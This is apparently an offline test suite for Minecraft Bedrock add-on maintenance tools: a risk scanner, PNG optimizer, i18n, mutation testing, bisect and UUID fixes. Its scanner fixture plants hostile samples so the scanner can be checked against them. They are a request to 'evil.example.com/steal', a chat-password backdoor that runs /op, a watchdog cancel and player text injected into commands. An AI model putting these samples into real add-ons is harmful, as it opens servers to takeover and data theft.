#!/usr/bin/env node
// The v41 upkeep tools without a server, an AI or network: scan, optimize (PNG + unused + junk), i18n (with a fake AI), mutate
// and bisect (on a fake lab whose tests read the unit's files), maint uuids, the knowledge refresh, the kit sync, betaWhy, the
// tests.txt lint and the type-error compaction. node tests/upkeep-offline.mjs
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import http from 'node:http';
import zlib from 'node:zlib';
import { fileURLToPath, pathToFileURL } from 'node:url';

const TOP = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const imp = (m) => import(pathToFileURL(path.join(TOP, 'common', m)).href);
const T = fs.mkdtempSync(path.join(os.tmpdir(), 'bdslab-env-upkeep-'));
let good = 0, bad = 0;
const check = (c, name, info = '') => { if (c) { good++; console.log(`✔ ${name}`); } else { bad++; console.log(`✘ ${name}\n    ${String(info).slice(-2000).split('\n').join('\n    ')}`); } };
const put = (p, t) => { fs.mkdirSync(path.dirname(p), { recursive: true }); fs.writeFileSync(p, t); };
const man = (uuid, mods = [], deps = []) => JSON.stringify({ format_version: 2, header: { name: 'X', description: 'x', uuid, version: [1, 0, 0], min_engine_version: [1, 21, 0] }, modules: mods.map((u) => ({ type: 'script', uuid: u, version: [1, 0, 0] })), dependencies: deps }, null, 2);

// ---------- scan ----------
const S = await imp('scan.mjs');
const risky = path.join(T, 'risky');
put(path.join(risky, 'bp', 'manifest.json'), man('11111111-0000-4000-8000-000000000001', ['11111111-0000-4000-8000-000000000002'], [{ module_name: '@minecraft/server-net', version: '1.0.0-beta' }, { module_name: '@minecraft/server', version: '2.0.0' }]));
put(path.join(risky, 'bp', 'scripts', 'main.js'), [
  "import { http } from '@minecraft/server-net';",
  "http.request('https://evil.example.com/steal');",
  "world.beforeEvents.chatSend.subscribe((e) => { if (e.message === 'letmein') e.sender.runCommand('op @s'); });",
  'const f = new Function("return 1");',
  "p.runCommand(`give ${e.message} diamond`);",
  "p.runCommand(`tp ${p.name} 0 64 0`);",
  "p.runCommand(`say ${e.message}`);",
  "system.beforeEvents.watchdogTerminate.subscribe((e) => { e.cancel = true; });",
].join('\n'));
put(path.join(risky, 'bp', 'functions', 'boot.mcfunction'), '# hi\nexecute as @a run deop @s\nsay ok\n');
let r = S.scanPath(risky);
const rk = r.risks.map(([w]) => w).join('\n');
check(/^net:/m.test(rk) && /evil\.example\.com/.test(rk) && /perm: runs \/op/.test(rk) && /perm: runs \/deop/.test(rk) && /^eval:/m.test(rk) && /^watchdog:/m.test(rk), 'scan: network + host, /op in a script, /deop in a function, eval, watchdog', rk);
check(/inject: a player's text/.test(rk) && r.notes.some(([w]) => /inject: a player name/.test(w)) && !r.risks.concat(r.notes).some(([w, at]) => /inject/.test(w) && at.some((a) => /:7$/.test(a))), 'scan: player text in a command = risk, a bare name = note, /say text = nothing', JSON.stringify(r));
check(r.risks.find(([w]) => /perm: runs \/op/.test(w))[1].includes('bp/scripts/main.js:3'), 'scan: says where (file:line)');
const clean = path.join(T, 'clean');
put(path.join(clean, 'bp', 'manifest.json'), man('22222222-0000-4000-8000-000000000001'));
put(path.join(clean, 'bp', 'scripts', 'main.js'), "world.afterEvents.playerSpawn.subscribe((e) => e.player.runCommand('give @s bread 1'));\np.runCommand(`give \"${p.name}\" apple`);\n");
r = S.scanPath(clean);
check(!r.risks.length && r.notes.some(([w]) => /^commands: give/.test(w)), 'scan: a clean addon has no risk (a quoted name is fine), its commands noted', JSON.stringify(r));
// an .mcaddon with an .mcpack inside
const zipOf = (entries) => { const parts = [], cen = []; let off = 0; for (const [name, data] of entries) { const nb = Buffer.from(name), comp = zlib.deflateRawSync(data), h = Buffer.alloc(30); h.writeUInt32LE(0x04034b50, 0); h.writeUInt16LE(20, 4); h.writeUInt16LE(8, 8); h.writeUInt32LE(comp.length, 18); h.writeUInt32LE(data.length, 22); h.writeUInt16LE(nb.length, 26); parts.push(h, nb, comp); const c = Buffer.alloc(46); c.writeUInt32LE(0x02014b50, 0); c.writeUInt16LE(20, 6); c.writeUInt16LE(8, 10); c.writeUInt32LE(comp.length, 20); c.writeUInt32LE(data.length, 24); c.writeUInt16LE(nb.length, 28); c.writeUInt32LE(off, 42); cen.push(c, nb); off += 30 + nb.length + comp.length; } const cd = Buffer.concat(cen), e = Buffer.alloc(22); e.writeUInt32LE(0x06054b50, 0); e.writeUInt16LE(entries.length, 8); e.writeUInt16LE(entries.length, 10); e.writeUInt32LE(cd.length, 12); e.writeUInt32LE(off, 16); return Buffer.concat([...parts, cd, e]); };
const inner = zipOf([['manifest.json', Buffer.from(man('33333333-0000-4000-8000-000000000001'))], ['scripts/main.js', Buffer.from("x.runCommand('kick Steve');")]]);
fs.writeFileSync(path.join(T, 'a.mcaddon'), zipOf([['Pack_BP.mcpack', inner]]));
r = S.scanPath(path.join(T, 'a.mcaddon'));
check(r.risks.some(([w, at]) => /perm: runs \/kick/.test(w) && at[0] === 'Pack_BP/scripts/main.js:1'), 'scan: an .mcaddon with an .mcpack inside is opened', JSON.stringify(r));

// ---------- optimize ----------
const O = await imp('optimize.mjs'), X = await imp('extra.mjs');
const img = { w: 16, h: 16, data: Buffer.alloc(16 * 16 * 4) };
for (let i = 0; i < 256; i++) { img.data[i * 4] = (i * 7) & 255; img.data[i * 4 + 1] = i & 0xf0; img.data[i * 4 + 2] = 40; img.data[i * 4 + 3] = 255; }
const fat = Buffer.concat([X.pngEncode(img).subarray(0, -12), (() => { const d = Buffer.from('Comment\0' + 'made with an editor '.repeat(20)), l = Buffer.alloc(4); l.writeUInt32BE(d.length); return Buffer.concat([l, Buffer.from('tEXt'), d, Buffer.alloc(4)]); })(), X.pngEncode(img).subarray(-12)]);
const slim = O.pngSmaller(fat);
check(slim && slim.length < fat.length && X.pngDecode(slim).data.equals(img.data) && slim[25] === 2 && !slim.includes(Buffer.from('tEXt')), `optimize: PNG ${fat.length} → ${slim?.length} bytes, same pixels, opaque RGBA → RGB, metadata gone`);
const ck = Buffer.from(X.pngEncode(img)); ck[25] = 6;   // (a color-key tRNS PNG: left as it is but for metadata)
check(O.pngSmaller(Buffer.from('not a png')) === null, 'optimize: not a PNG → untouched');
check(O.JUNK.test('models/sword.bbmodel') && O.JUNK.test('textures/Thumbs.db') && O.JUNK.test('art/ruby.psd') && !O.JUNK.test('textures/items/ruby.png'), 'optimize: design / OS files are junk, textures are not');
const ou = path.join(T, 'opt');
put(path.join(ou, 'rp', 'textures', 'items', 'ruby.png'), fat); put(path.join(ou, 'rp', 'textures', 'items', 'old.png'), fat); put(path.join(ou, 'rp', 'textures', 'blocks', 'stone.png'), fat);
put(path.join(ou, 'rp', 'textures', 'item_texture.json'), JSON.stringify({ texture_data: { ruby: { textures: 'textures/items/ruby' } } }));
const un = O.unusedTextures(ou, new Set(['blocks/stone']));
check(un.length === 1 && un[0].file.endsWith('old.png') && un[0].sure, 'optimize: unused = named by nothing and not a vanilla path it replaces', JSON.stringify(un));
check(O.unusedTextures(ou, null).every((x) => !x.sure), 'optimize: without vanilla\'s list nothing is "sure" (--prune keeps them)');

// ---------- i18n (a fake AI) ----------
const I = await imp('i18n.mjs');
const iu = path.join(T, 'lab', 'bds', 'addons', 'tr');
put(path.join(iu, 'rp', 'texts', 'languages.json'), '["en_US","ja_JP"]');
put(path.join(iu, 'rp', 'texts', 'en_US.lang'), 'item.lab:ruby.name=Ruby\ntile.lab:ore.name=Ruby Ore\nentity.lab:slime.name=Slime\n');
put(path.join(iu, 'rp', 'texts', 'ja_JP.lang'), 'item.lab:ruby.name=ルビー\n');
put(path.join(iu, 'bp', 'manifest.json'), man('44444444-0000-4000-8000-000000000001'));
check(I.missing(iu).map((m) => m.key).join() === 'tile.lab:ore.name,entity.lab:slime.name' && I.missing(iu)[0].ref === 'Ruby Ore', 'i18n: what ja_JP lacks, with the en_US text');
check(I.answer('Here:\ntile.lab:ore.name=ルビー鉱石\n- entity.lab:slime.name = スライム\nother=x', ['tile.lab:ore.name', 'entity.lab:slime.name']).size === 2, 'i18n: the AI answer parsed (extra lines ignored)');
let asked = '';
const srv = http.createServer((q, s) => { let b = ''; q.on('data', (d) => (b += d)); q.on('end', () => { asked = JSON.parse(b).messages[0].content; s.setHeader('content-type', 'application/json'); s.end(JSON.stringify({ content: [{ type: 'text', text: 'tile.lab:ore.name=ルビー鉱石\nentity.lab:slime.name=スライム' }], usage: { input_tokens: 120, output_tokens: 30 } })); }); });
await new Promise((ok) => srv.listen(0, '127.0.0.1', ok));
const env = { ...process.env, LAB_LABS_ROOT: path.join(T, 'lab'), LAB_KIND: 'bds', LAB_DOTENV: 'off', ANTHROPIC_API_KEY: 'fake', ANTHROPIC_BASE_URL: `http://127.0.0.1:${srv.address().port}`, LAB_NOTRACE: '1' };
const runAsync = (args, e = {}) => new Promise((ok) => { const { spawn } = require_cp; const c = spawn(process.execPath, [path.join(TOP, 'lab.mjs'), ...args], { cwd: TOP, env: { ...env, ...e } }); let t = ''; c.stdout.on('data', (d) => (t += d)); c.stderr.on('data', (d) => (t += d)); c.on('close', (code) => ok({ code, text: t })); });
const require_cp = await import('node:child_process');
let o = await runAsync(['i18n', '-a', 'tr']);
check(o.code === 1 && /ja_JP lacks 2/.test(o.text) && /tile\.lab:ore\.name=Ruby Ore/.test(o.text), 'i18n cli: lists the missing lines with their text', o.text);
o = await runAsync(['i18n', '-a', 'tr', '--ai']);
const ja = fs.readFileSync(path.join(iu, 'rp', 'texts', 'ja_JP.lang'), 'utf8');
check(o.code === 0 && /ルビー鉱石/.test(ja) && /スライム/.test(ja) && /150 tokens/.test(o.text) && /Japanese/.test(asked) && !/item\.lab:ruby/.test(asked), 'i18n --ai: one small call with only the missing lines; written', o.text + asked);
o = await runAsync(['i18n', '-a', 'tr', 'ja_JP', 'item.lab:ruby.name=紅玉']);
check(/item\.lab:ruby\.name=紅玉/.test(fs.readFileSync(path.join(iu, 'rp', 'texts', 'ja_JP.lang'), 'utf8')) && /OK ja_JP: 1/.test(o.text), 'i18n <lang> key=text: written in place (no file to open)', o.text);
o = await runAsync(['i18n', '-a', 'tr', '--add', 'zh_CN']);
check(JSON.parse(fs.readFileSync(path.join(iu, 'rp', 'texts', 'languages.json'), 'utf8')).includes('zh_CN') && /zh_CN lacks 3/.test(o.text), 'i18n --add zh_CN: listed, its lines to fill', o.text);
o = await runAsync(['i18n', '-a', 'tr', '--add', 'xx_YY']);
check(o.code === 1 && /ERR xx_YY/.test(o.text), 'i18n --add: an unknown language code is refused');
srv.close();

// ---------- mutate and bisect on a fake lab (its `test` reads the unit's src/main.ts) ----------
const FAKE = String.raw`import fs from 'node:fs'; import path from 'node:path'; import { fileURLToPath } from 'node:url';
const a = process.argv.slice(2), u = a[a.indexOf('-a') + 1], D = path.join(path.dirname(fileURLToPath(import.meta.url)), 'addons', u);
const src = fs.readFileSync(path.join(D, 'src', 'main.ts'), 'utf8');
if (a[0] === 'test') {
  if (/BROKEN_BUILD/.test(src)) { console.log('E src/main.ts:1 TS1005 ; expected'); console.log('FAIL'); process.exit(1); }
  const ok = !/BUG/.test(src) && src.includes('x === 1') && src.includes('limit = 3');
  if (process.env.LAB_SECTIONS) console.log('SECTION ' + (ok ? 'PASS' : 'FAIL') + ' core');
  if (!ok) console.log('✘ 2: ## core > js f(1)\n  want = one');
  if (a.includes('--cov')) console.log('COV 80% of code lines ran | src/main.ts 4/5 never ran: 5');
  console.log((ok ? 'PASS' : 'FAIL') + ' 1/1'); process.exit(ok ? 0 : 1);
}
console.log('fake ' + a.join(' '));`;
const L = path.join(T, 'lab');
put(path.join(L, 'bds', 'lab.mjs'), FAKE);
const mu = path.join(L, 'bds', 'addons', 'mu');
const MAIN = "export function f(x: number) { if (x === 1) return 'one'; return 'other'; }\nconst limit = 3;\nconst verbose = true;\nworld.sendMessage('hi');\nfunction never() { return 1 + 1; }\n";
put(path.join(mu, 'src', 'main.ts'), MAIN); put(path.join(mu, 'tests.txt'), '## core\njs f(1)\n= one\n'); put(path.join(mu, 'bp', 'manifest.json'), man('55555555-0000-4000-8000-000000000001'));
const Mu = await imp('mutate.mjs');
check(Mu.mask("a === 'x === y' // b > c") === "a === '       ' " + ' '.repeat(10).slice(0, 8), 'mutate: strings and comments are blanked', JSON.stringify(Mu.mask("a === 'x === y' // b > c")));
const sites = Mu.sites([['src/main.ts', MAIN]], new Set(['src/main.ts:5']));
check(sites.some((s) => s.kind === 'cmp' && s.line === 1) && sites.some((s) => s.kind === 'call' && s.line === 4) && sites.some((s) => s.kind === 'bool' && s.line === 3) && !sites.some((s) => s.line === 5), 'mutate: sites in the lines that ran (cmp, call, bool, num), none in a line never run', JSON.stringify(sites));
check(Mu.pick(sites, 3).map((s) => s.kind).join() === 'call,cmp,bool', 'mutate: the kinds taken in turn, a left-out call first');
o = await runAsync(['mutate', '-a', 'mu', '--all']);
check(/caught .*src\/main\.ts:1 `===` → `!==`/.test(o.text) && /survived src\/main\.ts:4 `world\.sendMessage\('hi'\);` left out/.test(o.text) && /^S src\/main\.ts:3 `true` → `false`: no test notices/m.test(o.text) && /W mutate mu: \d+\/\d+ bugs caught/.test(o.text), 'mutate: caught and surviving bugs, each survivor an S line', o.text);
check(fs.readFileSync(path.join(mu, 'src', 'main.ts'), 'utf8') === MAIN && (!fs.existsSync(path.join(L, 'bds', '.lab', 'hold')) || fs.readdirSync(path.join(L, 'bds', '.lab', 'hold')).length === 0), 'mutate: the unit exactly as before, nothing left aside');
// bisect: checkpoints good, good, bad, bad; now bad
const CP = await (async () => { process.env.LAB_LABS_ROOT = L; return import(pathToFileURL(path.join(TOP, 'common', 'checkpoint.mjs')).href + '?bisect'); })();
const stage = (t, label) => { fs.writeFileSync(path.join(mu, 'src', 'main.ts'), t); return CP.save('bds', 'mu', label); };
stage(MAIN, 'one'); stage(MAIN + '// two\n', 'two'); stage(MAIN + '// two\n// BUG three\n', 'three'); stage(MAIN + '// BUG four\n', 'four');
fs.writeFileSync(path.join(mu, 'src', 'main.ts'), MAIN + '// BUG now\n');
o = await runAsync(['bisect', '-a', 'mu']);
check(/FOUND \S+ \(three\) broke it; \S+ \(two\) was the last that passed/.test(o.text) && /^\+\/\/ BUG three$/m.test(o.text) && /src\/main\.ts/.test(o.text), 'bisect: the first failing checkpoint, the last passing one, the diff', o.text);
check(fs.readFileSync(path.join(mu, 'src', 'main.ts'), 'utf8') === MAIN + '// BUG now\n', 'bisect: the unit exactly as it was');
// an older state that failed for another reason (it did not build): the gallop back passes it, the ones skipped are tried
const bi = path.join(L, 'bds', 'addons', 'bi2'); fs.cpSync(mu, bi, { recursive: true });
const stage2 = (t, label) => { fs.writeFileSync(path.join(bi, 'src', 'main.ts'), t); return CP.save('bds', 'bi2', label); };
stage2(MAIN + '// BROKEN_BUILD\n', 'old'); stage2(MAIN, 'good'); stage2(MAIN + '// BUG a\n', 'a'); stage2(MAIN + '// BUG b\n', 'b'); stage2(MAIN + '// BUG c\n', 'c');
fs.writeFileSync(path.join(bi, 'src', 'main.ts'), MAIN + '// BUG now\n');
o = await runAsync(['bisect', '-a', 'bi2']);
check(/FOUND \S+ \(a\) broke it; \S+ \(good\) was the last that passed/.test(o.text) && /FAIL — the same/.test(o.text), 'bisect: an old state broken for another reason does not hide the break', o.text);
fs.writeFileSync(path.join(mu, 'src', 'main.ts'), MAIN);
o = await runAsync(['bisect', '-a', 'mu']);
check(o.code === 0 && /OK mu passes now/.test(o.text), 'bisect: passing now → nothing to look for (one run)', o.text);

// ---------- maint uuids ----------
const M = await imp('maint.mjs');
const ua = path.join(L, 'bds', 'addons', 'orig'), ub = path.join(L, 'bds', 'addons', 'copy');
for (const d of [ua, ub]) { put(path.join(d, 'bp', 'manifest.json'), man('66666666-0000-4000-8000-000000000001', ['66666666-0000-4000-8000-000000000002'], [{ uuid: '66666666-0000-4000-8000-000000000003', version: [1, 0, 0] }])); put(path.join(d, 'rp', 'manifest.json'), man('66666666-0000-4000-8000-000000000003', ['66666666-0000-4000-8000-000000000004'])); }
const t0 = new Date(Date.now() - 3600_000); fs.utimesSync(ua, t0, t0);
r = await M.maint({ top: L, tmp: T, env: {}, only: ['uuids'] });
check(r.problems === 1 && /^W uuids: .*(copy（orig と同じ）|orig（copy と同じ）)/.test(r.lines[0]), 'maint uuids: two units with the same pack UUIDs found', r.lines.join('\n'));
r = await M.maint({ top: L, tmp: T, env: {}, fix: true, only: ['uuids'] });
const rd = [ua, ub].find((d) => JSON.parse(fs.readFileSync(path.join(d, 'bp', 'manifest.json'), 'utf8')).header.uuid !== '66666666-0000-4000-8000-000000000001'), rj = (d, p) => JSON.parse(fs.readFileSync(path.join(d, p, 'manifest.json'), 'utf8'));
check(r.lines[0]?.startsWith('FIX uuids') && rd && rj(rd, 'bp').dependencies[0].uuid === rj(rd, 'rp').header.uuid && rj(rd, 'rp').header.uuid !== '66666666-0000-4000-8000-000000000003' && (await M.maint({ top: L, tmp: T, env: {}, only: ['uuids'] })).problems === 0, 'maint uuids --fix: one of them gets new UUIDs, its BP still finds its RP', r.lines.join('\n'));

// ---------- the knowledge refresh ----------
const R = await imp('refresh.mjs');
put(path.join(L, 'common', 'data', 'bds-versions.json'), JSON.stringify({ cdn_root: 'x', linux: { stable: '1.26.51.1', preview: '1.26.60.27', versions: ['1.26.45.1', '1.26.51.1'], preview_versions: ['1.26.60.27'] } }, null, 2));
put(path.join(L, 'common', 'data', 'minecraft-modules.json'), JSON.stringify({ server: { modified: 1, versions: { stable: { version: '2.10.0' }, beta: { version: '2.11.0-beta.1.26.51-stable' }, preview: null, preview_beta: { version: '2.12.0-beta.1.26.60-preview.25' } } } }, null, 2));
check(R.addVersion(L, '1.26.52.3') === '+1.26.52.3, stable 1.26.52.3' && R.addVersion(L, '1.26.52.3') === '' && R.addVersion(L, '1.26.60.29', { preview: true }).includes('preview 1.26.60.29'), 'refresh: a new BDS version recorded once');
const doc = async () => ({ versions: { '2.10.0': 1, '2.11.0': 1, '2.12.0': 1, '2.11.0-beta.1.26.52-stable': 1, '2.12.0-beta.1.26.60-preview.29': 1 }, time: { '2.10.0': '2026-07-01', '2.11.0': '2026-09-01', '2.12.0': '2026-12-01', '2.11.0-beta.1.26.52-stable': '2026-09-10' } });
const ch = await R.refreshModules(L, '1.26.52.3', doc), mj = JSON.parse(fs.readFileSync(path.join(L, 'common', 'data', 'minecraft-modules.json'), 'utf8'));
check(ch.length === 3 && mj.server.versions.beta.version === '2.11.0-beta.1.26.52-stable' && mj.server.versions.stable.version === '2.11.0' && mj.server.versions.preview_beta.version.endsWith('preview.29'), 'refresh: module versions for that BDS (stable out by then, not a later one)', JSON.stringify(ch));
put(path.join(L, 'common', 'data', 'kb.json'), '{\n "about": "x",\n "version": "1.26.51.1",\n "items": {}\n}\n'); put(path.join(L, 'bds', '.lab', 'bds', 'VERSION'), '1.26.52.3');
check(R.kbState(L).stale && (fs.writeFileSync(path.join(L, 'bds', '.lab', 'bds', 'VERSION'), '1.26.51.2'), !R.kbState(L).stale), 'refresh: kb.json stale only for another BDS family');

// ---------- the kit, beta reasons, tests.txt lint, type errors ----------
const B = await imp('build.mjs');
const kd = path.join(T, 'kitdir'), ku = path.join(T, 'ku');
put(path.join(kd, 'kit.ts'), '// new kit\nexport const a = 2;\n'); put(path.join(ku, 'src', 'kit.ts'), '// old kit\r\nexport const a = 1;\r\n');
put(path.join(kd, 'versions.json'), JSON.stringify({ ts: [B.kitHash('// old kit\nexport const a = 1;\n'), B.kitHash('// new kit\nexport const a = 2;\n')], js: [] }));
const st = B.kitStale(ku, path.join(ku, 'bp'), kd);
check(st && st.was === 1 && st.of === 2, 'kit: an unedited old copy (CRLF too) is stale');
put(path.join(ku, 'src', 'kit.ts'), '// old kit\nexport const a = 1; // mine\n');
check(B.kitStale(ku, path.join(ku, 'bp'), kd) === null, 'kit: an edited copy is never replaced');
check(B.betaWhy(["E src/main.ts:12,40 TS2339 Property 'getAllPlayersBeta' does not exist on type 'World'.", 'FAIL']) === 'uses beta-only World.getAllPlayersBeta (src/main.ts:12)' && /^on the stable modules: ✘/.test(B.betaWhy(['✘ 3: ## core', 'FAIL 0/1'])), 'betaWhy: the beta-only API and where, else the first failure');
const LT = await imp('lint-tests.mjs');
put(path.join(T, 'tt.txt'), '## a\n@A cmd /x\n@A jmup\n~ ok(\nwait soon\njs (1 +\n');
const lint = LT.lintTests(path.join(T, 'tt.txt'), 'tests.txt');
check(lint.some((l) => /unknown action jmup.*jump/.test(l)) && lint.some((l) => /Invalid regular expression/.test(l)) && lint.some((l) => /wait/.test(l)) && lint.some((l) => /js/.test(l)), 'tests.txt lint: a typo of an action (with the right one), a bad regex, wait without ms, js that does not parse', lint.join('\n'));
const cd = B.compactDiags([...Array(30)].map((_, i) => ({ code: 2339, msg: "Property 'x' does not exist on type 'World'.", at: { file: 'src/main.ts', line: i + 1 } })).concat([{ code: 2304, msg: "Cannot find name 'y'.", at: { file: 'src/a.ts', line: 3 } }]));
check(cd.length === 2 && /src\/main\.ts:1,2,3,4,5,6,…/.test(cd[0]), 'type errors: the same error on 30 lines is one line', cd.join('\n'));
const fx = B.compactDiags([{ code: 2345, msg: "Argument of type 'string' is not assignable to parameter of type 'ItemStack'.", at: { file: 'src/main.ts', line: 4 } }, { code: 2339, msg: "Property 'setGlowing' does not exist on type 'Player'.", at: { file: 'src/main.ts', line: 5 } }, { code: 2532, msg: "Object is possibly 'undefined'.", at: { file: 'src/main.ts', line: 6 } }]);
check(/→ new ItemStack\('ns:id', n\)/.test(fx[0]) && /→ not in this API version: node lab\.mjs api Player$/.test(fx[1]) && /→ getComponent\/getItem\/find can give undefined/.test(fx[2]), 'type errors the Script API keeps causing end with the fix (ItemStack, a member this version lacks, possibly undefined)', fx.join('\n'));

// ---------- the build's memos: which SDK a manifest means (no npm for 12 h), a type check that passed on the same sources ----------
{
  const cache = path.join(T, 'memo-cache'), deps = [{ module_name: '@minecraft/server', version: '2.0.0' }];
  let asked = 0;
  const npmDoc = async () => { asked++; throw new Error('npm asked'); };
  const want = JSON.stringify(['1.26.50', ['@minecraft/server@2.0.0'], B.LIBS, '@bedrock-apis/env-types@1.1.0-rc']);
  put(path.join(cache, 'sdk', 'k1', 'ok'), 'x\n');
  put(path.join(cache, 'sdk', 'resolved.json'), JSON.stringify({ [want]: { key: 'k1', at: Date.now() } }));
  const dir = await B.sdk({ cache, bv: '1.26.50', deps, npmDoc });
  check(dir === path.join(cache, 'sdk', 'k1') && asked === 0, 'build: the SDK a manifest meant a moment ago comes from the memo, npm not asked', `${dir} asked=${asked}`);
  const late = async (extra) => { try { await B.sdk({ cache, bv: '1.26.50', deps, npmDoc, ...extra }); return 'returned'; } catch (e) { return e.message; } };
  put(path.join(cache, 'sdk', 'resolved.json'), JSON.stringify({ [want]: { key: 'k1', at: Date.now() - 13 * 3600_000 } }));
  const old = await late();
  process.env.LAB_SDK_MEMO = '0';
  put(path.join(cache, 'sdk', 'resolved.json'), JSON.stringify({ [want]: { key: 'k1', at: Date.now() } }));
  const off = await late();
  delete process.env.LAB_SDK_MEMO;
  check(old === 'npm asked' && off === 'npm asked' && asked === 2, 'build: a memo older than 12 h, or LAB_SDK_MEMO=0, asks npm again', `${old} / ${off} asked=${asked}`);
  // a fake TypeScript: counts its loads, finds what `bad` says
  let loads = 0, bad = [];
  const tl = { get ts() { loads++; return { sys: {}, getParsedCommandLineOfConfigFile: () => ({ options: {}, fileNames: [] }), createIncrementalCompilerHost: () => ({}), flattenDiagnosticMessageText: (m) => m,
    createIncrementalProgram: () => ({ getConfigFileParsingDiagnostics: () => [], getSyntacticDiagnostics: () => [], getSemanticDiagnostics: () => bad.map((m) => ({ code: 2304, messageText: m })), emit() {} }) }; } };
  const unit = path.join(T, 'memo-unit');
  put(path.join(unit, 'tsconfig.json'), '{}\n'); put(path.join(unit, 'src', 'main.ts'), 'export const a = 1;\n');
  const tc = () => B.typecheck({ tl, addon: unit, cache, js: false });
  const r1 = tc(), r2 = tc(), l2 = loads;
  put(path.join(unit, 'src', 'main.ts'), 'export const a = 2;\n'); const r3 = tc(), l3 = loads;
  bad = ["Cannot find name 'y'."]; put(path.join(unit, 'src', 'main.ts'), 'export const a = y;\n'); const r4 = tc(), r5 = tc();
  check(r1.length === 0 && r2.length === 0 && l2 === 1 && r3.length === 0 && l3 === 2 && r4.length === 1 && r5.length === 1 && loads === 4, 'build: a type check that passed is not run again on the same sources (TypeScript not even loaded); a change, or a check that found errors, runs it', `loads=${l2},${l3},${loads} ${JSON.stringify([r1, r2, r3, r4, r5])}`);
}

fs.rmSync(T, { recursive: true, force: true });
console.log(`${bad ? 'FAIL' : 'PASS'} upkeep-offline ${good}/${good + bad}`);
process.exit(bad ? 1 : 0);
